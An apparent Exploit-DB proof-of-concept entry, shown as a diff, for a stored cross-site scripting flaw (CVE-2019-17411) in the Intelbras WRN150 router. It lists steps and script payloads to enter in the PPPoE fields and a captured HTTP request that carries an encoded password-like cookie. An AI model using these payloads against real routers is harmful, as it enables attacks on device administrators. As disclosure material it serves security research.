@@ -1,0 +1,39 @@
+# Exploit Title: Intelbras Router WRN150 1.0.18 - Persistent Cross-Site Scripting
+# Date: 2019-10-03
+# Exploit Author: Prof. Joas Antonio
+# Vendor Homepage: https://www.intelbras.com/pt-br/
+# Software Link: http://en.intelbras.com.br/node/25896
+# Version: 1.0.18
+# Tested on: Windows
+# CVE : CVE-2019–17411
+
+# PoC 1:
+
+1) Login to your router
+
+2) After signing in as WAN Settings
+
+3) Select for PPPOE mode
+
+4) In the Service Name and Server Name field, enter any of these payloads:
+
+<script> alert ("Hacked") </script>
+
+<script> alert (1) </script>
+
+# PoC burp.txt
+
+POST /goform/AdvSetWan HTTP/1.1
+Host: TARGET
+Content-Length: 281
+Cache-Control: max-age=0
+Origin: http://TARGET
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Referer: http://TARGET/wan_connected.asp
+Accept-Encoding: gzip, deflate
+Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: ecos_pw=bWFkYXJhMTIxMQ==2dw:language=pt
+Connection: close
